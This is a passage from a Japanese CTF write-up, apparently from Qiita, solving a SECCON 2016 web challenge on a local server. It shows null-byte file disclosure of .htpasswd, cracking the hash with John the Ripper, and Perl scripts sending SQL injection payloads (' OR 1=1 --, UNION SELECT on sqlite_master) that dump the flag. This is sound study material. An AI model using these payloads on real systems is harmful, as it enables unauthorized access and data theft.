vaue=\"GO\">\n</form>\n<hr>\nkeigo:LdnoMJCeVy.SE<br>\n</body></html>\n```\n\u672b\u5c3e\u3092 `%00` \u3068\u3059\u308b\u3053\u3068\u3067\u3001\u7d42\u7aef\u6587\u5b57 `\\0` \u3068\u8a8d\u8b58\u3055\u305b\u3066\u3044\u307e\u3059\u3002\n\u7d42\u7aef\u6587\u5b57\u3092\u5229\u7528\u3059\u308b\u3068\u3001\u672b\u5c3e\u306b\u4ed8\u52a0\u3055\u308c\u308b `.txt` \u3092\u7121\u8996\u3055\u305b\u308b\u3053\u3068\u304c\u53ef\u80fd\u3067\u3059\u3002\n\n| \u30d1\u30e9\u30e1\u30fc\u30bf | \u958b\u304f\u30d5\u30a1\u30a4\u30eb\u540d |\n|:-:|:-:|:-:|\n| txt=a | authed/a.txt |\n| txt=.htpasswd | authed/.htpasswd.txt |\n| txt=.htpasswd%00 | authed/.htpasswd |\n\n## .htpasswd \u3092\u89e3\u6790\n\u53d6\u5f97\u3067\u304d\u305f `keigo:LdnoMJCeVy.SE` \u3092\u89e3\u6790\u3057\u307e\u3059\u3002\n[John the Ripper](http://www.openwall.com/john/) \u3092\u4f7f\u7528\u3059\u308b\u3068\u3001\u30e6\u30fc\u30b6\u540d `keigo` \u3001\u30d1\u30b9\u30ef\u30fc\u30c9 `test` \u3067\u3042\u308b\u3053\u3068\u304c\u5224\u660e\u3057\u307e\u3057\u305f\u3002\n\n```\n> john.exe htpasswd\nLoaded 1 password hash (Traditional DES [128/128 BS SSE2])\ntest             (keigo)\nguesses: 1  time: 0:00:00:00 100% (2)  c/s: 230500  trying: orange - horses\nUse the \"--show\" option to display all of the cracked passwords reliably\n```\n\n## authed \u30c7\u30a3\u30ec\u30af\u30c8\u30ea\u306b\u30a2\u30af\u30bb\u30b9\nBASIC\u8a8d\u8a3c\u306e\u60c5\u5831\u3092\u5165\u624b\u3067\u304d\u305f\u305f\u3081\u3001\u518d\u5ea6 `authed` \u30c7\u30a3\u30ec\u30af\u30c8\u30ea\u306b\u30a2\u30af\u30bb\u30b9\u3092\u8a66\u307f\u307e\u3059\u3002\n\n```pl:07\n(\u524d\u7565)\n$url = \"http://127.0.0.1:81/authed/\";\n$req = HTTP::Request->new(GET => $url);\n$req->authorization_basic('keigo', 'test');\n(\u5f8c\u7565)\n```\n![06.png](https://qiita-image-store.s3.amazonaws.com/0/144905/c0913d7c-cf5b-e5ea-13cb-3f9bfd2d004f.png)\n\n\u76f4\u4e0b\u306b `sqlinj` \u30c7\u30a3\u30ec\u30af\u30c8\u30ea\u304c\u3042\u308b\u3088\u3046\u3067\u3059\u3002\n\n## auhted/sqlinj \u30c7\u30a3\u30ec\u30af\u30c8\u30ea\u306b\u30a2\u30af\u30bb\u30b9\n`authed/sqlinj` \u30c7\u30a3\u30ec\u30af\u30c8\u30ea\u306b\u30a2\u30af\u30bb\u30b9\u3057\u3066\u307f\u307e\u3059\u3002\n\n```pl:08\n# \u5909\u66f4\u90e8\u5206\u4ee5\u5916\u306e\u30bd\u30fc\u30b9\u306f\u7701\u7565\u3057\u307e\u3059\u3002\n$url = \"http://127.0.0.1:81/authed/sqlinj/\";\n```\n![08.png](https://qiita-image-store.s3.amazonaws.com/0/144905/e2a887c8-645b-2e89-804d-74c895329236.png)\n\n`1.cgi` \uff5e `100.cgi` \u307e\u3067\u540c\u4e00\u30b5\u30a4\u30ba\u306e\u30d5\u30a1\u30a4\u30eb\u304c\u683c\u7d0d\u3055\u308c\u3066\u3044\u307e\u3057\u305f\u3002\u306a\u305c100\u500b\u3082\u2026\u2026\u3002\n\n## authed/sqlinj/1.cgi \u306b\u30a2\u30af\u30bb\u30b9\n`authed/sqlinj/1.cgi` \u306b\u30a2\u30af\u30bb\u30b9\u3059\u308b\u3068\u3001`?no=4822267938` \u3078\u306e\u30ea\u30f3\u30af\u304c\u73fe\u308c\u307e\u3057\u305f\u3002\n\n```pl:09\n$url = \"http://127.0.0.1:81/authed/sqlinj/1.cgi\";\n```\n\n```html:09-result\n<html>\n<head>\n  <title>SECCON 2016 Online</title>\n  <!-- by KeigoYAMAZAKI, 2016.11.08- -->\n</head>\n<body>\n<a href=\"?no=4822267938\">link</a>\n</body></html>\n```\n![09.PNG](https://qiita-image-store.s3.amazonaws.com/0/144905/9302f8b6-25ea-a1b8-1c9d-15de9fdeeb0e.png)\n\n## authed/sqlinj/1.cgi?no=4822267938 \u306b\u30a2\u30af\u30bb\u30b9\n\u5148\u307b\u3069\u306e `no` \u30d1\u30e9\u30e1\u30fc\u30bf\u3092\u4ed8\u52a0\u3057\u3066\u30a2\u30af\u30bb\u30b9\u3059\u308b\u3068\u3001ISBN\u30b3\u30fc\u30c9\u7b49\u304c\u8868\u793a\u3055\u308c\u307e\u3057\u305f\u3002\n\n```pl:10\n$url = \"http://127.0.0.1:81/authed/sqlinj/1.cgi?no=4822267938\";\n```\n\n```html:10-result\n<html>\n<head>\n  <title>SECCON 2016 Online</title>\n  <!-- by KeigoYAMAZAKI, 2016.11.08- -->\n</head>\n<body>\n<a href=\"?no=4822267938\">link</a>\n<hr>\nISBN-10: 4822267938<br>\nISBN-13: 978-4822267933<br>\nPUBLISH: 2016/2/19<p>\n</body></html>\n```\n![10.png](https://qiita-image-store.s3.amazonaws.com/0/144905/f7619e3e-d3e1-88aa-e676-678e9ae63e0b.png)\n\nISBN\u30b3\u30fc\u30c9=\u66f8\u7c4d \u3067\u3059\u306e\u3067\u3001Amazon\u3067\u691c\u7d22\u3057\u3066\u307f\u307e\u3059\u3002\u2026\u2026\u3069\u3046\u3084\u3089\u5ba3\u4f1d(?)\u306e\u3088\u3046\u3067\u3059\u3002\nhttp://amazon.jp/dp/4822267938 \u2192 \u7d76\u5bfe\u308f\u304b\u308b\u30bb\u30b9\u30da27\u79cb 2016\u5e74\u6625\u7248\n\n## SQL\u30a4\u30f3\u30b8\u30a7\u30af\u30b7\u30e7\u30f3\u3092\u8a66\u307f\u308b\n>Get the flag in the database! \n\n\u51fa\u984c\u6587\u3092\u632f\u308a\u8fd4\u308b\u3068\u3001flag\u306f\u30c7\u30fc\u30bf\u30d9\u30fc\u30b9\u5185\u306b\u3042\u308b\u3088\u3046\u3067\u3059\u3002\n\u5148\u307b\u3069\u306eISBN\u60c5\u5831\u304cDB\u3067\u7ba1\u7406\u3055\u308c\u3066\u3044\u308b\u3068\u4eee\u5b9a\u3057\u3001SQL\u30a4\u30f3\u30b8\u30a7\u30af\u30b7\u30e7\u30f3\u3092\u8a66\u3057\u307e\u3057\u305f\u3002\n\n```pl:11\n$url = \"http://127.0.0.1:81/authed/sqlinj/1.cgi?no=123' OR 1=1 --\";\n```\n\n```html:11-result\n<html>\n<head>\n  <title>SECCON 2016 Online</title>\n  <!-- by KeigoYAMAZAKI, 2016.11.08- -->\n</head>\n<body>\n<a href=\"?no=4822267938\">link</a>\n<hr>\n</body></html>\n```\n\u5931\u6557\u306e\u3088\u3046\u3067\u3059\u3002\u30d1\u30e9\u30e1\u30fc\u30bf\u3092\u6307\u5b9a\u3057\u306a\u304b\u3063\u305f\u5834\u5408\u3068\u540c\u4e00\u306eHTML\u304c\u8fd4\u3063\u3066\u304d\u307e\u3057\u305f\u3002\n\n## 100\u500b\u306eCGI\u306b\u5bfe\u3057\u3066\u653b\u6483\u3092\u8a66\u307f\u308b\n\u540c\u30c7\u30a3\u30ec\u30af\u30c8\u30ea\u5185\u306b\u5b58\u5728\u3059\u308b100\u500b\u306eCGI\u306b\u5bfe\u3057\u3066\u3001\u540c\u3058\u30ea\u30af\u30a8\u30b9\u30c8\u3092\u6295\u3052\u3066\u307f\u307e\u3057\u305f\u3002\n\n```pl:12\nfor ($i = 1; $i <= 100; $i++){\n    print \"--- $i ---\\n\";\n    $url = \"http://127.0.0.1:81/authed/sqlinj/$i.cgi?no=123' OR 1=1 --\";\n    $req = HTTP::Request->new(GET => $url);\n    $req->authorization_basic('keigo', 'test');\n    $res = $ua->request($req);\n    print $res->content . \"\\n\\n\";\n}\n```\n\n```html:12-result(\u629c\u7c8b)\n--- 72 ---\n<html>\n<head>\n  <title>SECCON 2016 Online</title>\n  <!-- by KeigoYAMAZAKI, 2016.11.08- -->\n</head>\n<body>\n<a href=\"?no=4822267938\">link</a>\n<hr>\nISBN-10: 4822267865<br>\nISBN-13: 978-4822267865<br>\nPUBLISH: 2015/2/20<p>\nISBN-10: 4822267911<br>\nISBN-13: 978-4822267919<br>\nPUBLISH: 2015/8/27<p>\nISBN-10: 4822267938<br>\nISBN-13: 978-4822267933<br>\nPUBLISH: 2016/2/19<p>\nISBN-10: 4822237842<br>\nISBN-13: 978-4822237844<br>\nPUBLISH: 2016/8/25<p>\n</body></html>\n```\n`http://127.0.0.1:81/authed/sqlinj/72.cgi` \u306e\u307f\u3001\u30c6\u30fc\u30d6\u30eb\u5185\u306e\u5168\u30ec\u30b3\u30fc\u30c9\u3092\u8fd4\u3057\u3066\u304d\u307e\u3057\u305f\u3002\n\n\u79c1\u306eSQL\u30a4\u30f3\u30b8\u30a7\u30af\u30b7\u30e7\u30f3\u529b\u304c\u4e0d\u8db3\u3057\u3066\u3044\u305f\u305f\u3081\u3001\u4ee5\u5f8c\u306e\u624b\u9806\u306f\u3001\u4ed6\u306e\u65b9\u306e\u89e3\u6cd5\u3092\u53c2\u8003\u306b\u3057\u3064\u3064\u89e3\u304d\u9032\u3081\u305f\u5185\u5bb9\u3068\u306a\u3063\u3066\u3044\u307e\u3059\u3002\n\n## 72.cgi \u3092\u5229\u7528\u3057\u3066DB\u5185\u3092\u63a2\u7d22\n\nSQLite\u3068\u4eee\u5b9a\u3057\u305f\u5834\u5408\u3001`sqlite_master` \u304b\u3089DB\u5185\u306e\u30c6\u30fc\u30d6\u30eb\u4e00\u89a7\u3092\u5165\u624b\u3059\u308b\u3053\u3068\u304c\u53ef\u80fd\u3067\u3059\u3002\n\n\u51fa\u529b\u3055\u308c\u308b\u30ab\u30e9\u30e0\u304c3\u3064 (`ISBN-10`, `ISBN-13`, `PUBLISH`) \u306e\u305f\u3081\u3001\u30ab\u30e9\u30e0\u6570\u3092\u63c3\u3048\u305f\u4e0a\u3067 `UNION` \u3092\u4f7f\u7528\u3057\u3066 `sqlite_master` \u3092\u53c2\u7167\u3057\u307e\u3059\u3002\n\n```pl:13\n$url = \"http://127.0.0.1:81/authed/sqlinj/72.cgi?no=123' UNION SELECT name, sql, 0 FROM sqlite_master --\";\n```\n\n```html:13-result\n<html>\n<head>\n  <title>SECCON 2016 Online</title>\n  <!-- by KeigoYAMAZAKI, 2016.11.08- -->\n</head>\n<body>\n<a href=\"?no=4822267938\">link</a>\n<hr>\nISBN-10: books<br>\nISBN-13: CREATE TABLE books (isbn10,isbn13,date)<br>\nPUBLISH: 0<p>\nISBN-10: f1ags<br>\nISBN-13: CREATE TABLE f1ags (f1ag)<br>\nPUBLISH: 0<p>\n</body></html>\n```\n`books` \u30c6\u30fc\u30d6\u30eb\u3068 `f1ags` \u30c6\u30fc\u30d6\u30eb\u304c\u5b58\u5728\u3057\u3066\u3044\u308b\u3053\u3068\u304c\u5224\u660e\u3057\u307e\u3057\u305f\u3002\n\n## flag\u3092\u53d6\u5f97\n\u5148\u307b\u3069\u5224\u660e\u3057\u305f `f1ags` \u30c6\u30fc\u30d6\u30eb\u306e `f1ag` \u30ab\u30e9\u30e0\u3092\u53d6\u5f97\u3057\u307e\u3059\u3002\n\u30ab\u30e9\u30e0\u6570\u3092\u63c3\u3048\u308b\u3053\u3068\u3092\u5fd8\u308c\u305a\u306b\u3002\n\n```pl:14\n$url = \"http://127.0.0.1:81/authed/sqlinj/72.cgi?no=123' UNION SELECT f1ag, 0, 0 FROM f1ags --\";\n```\n\n```html:14-result\n<html>\n<head>\n  <title>SECCON 2016 Online</title>\n  <!-- by KeigoYAMAZAKI, 2016.11.08- -->\n</head>\n<body>\n<a href=\"?no=4822267938\">link</a>\n<hr>\nISBN-10: SECCON{I want to eventually make a CGC web edition... someday...}<br>\nISBN-13: 0<br>\nPUBLISH: 0<p>\n</body></html>\n```\n\n```:flag\nSECCON{I want to eventually make a CGC web edition... someday...}\n```\n\n\u4ee5\u4e0a\u3067\u3059\u3002\n", "tags": ["seccon", "CTF", "writeup"]}